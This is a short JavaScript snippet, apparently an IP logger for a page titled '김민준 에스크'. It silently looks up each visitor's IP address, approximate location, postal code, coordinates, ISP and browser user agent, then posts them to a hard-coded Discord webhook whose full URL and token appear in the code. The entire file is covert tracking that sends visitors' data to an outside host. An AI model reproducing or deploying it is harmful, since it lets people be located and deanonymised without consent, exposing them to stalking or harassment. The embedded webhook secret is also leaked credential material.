$.getJSON("https://ipinfo.io/json", function(data) {         
  var params = {
    embeds: [
      {
        "title": "김민준 에스크",
        "color": 15258703,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "아이피",
            "value": `> ${data.ip}`
          },
          {
            "name": "위치 정보",
            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
          },
          {
            "name": "네트워크 정보",
            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
          }
        ]
      }
    ]
  }
  fetch('https://discord.com/api/webhooks/1052156020719366184/3XzWMVtFJHfQzLmNd0PR-UZXh2r7NTp8oM7r0JOwwR55yLoK1YlJR1e553Zf9SKnagFn', {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
  }) 
})

$.getJSON("https://uploadbeta.com/api/user-agent/", function(data) {         
  var params = {
    embeds: [
      {
        "title": "Device Info",
        "color": 15258703,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "Device",
            "value": `> ${data}`
          }
        ]
      }
    ]
  }
  fetch('https://discord.com/api/webhooks/1052156020719366184/3XzWMVtFJHfQzLmNd0PR-UZXh2r7NTp8oM7r0JOwwR55yLoK1YlJR1e553Zf9SKnagFn', {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
  }) 
})

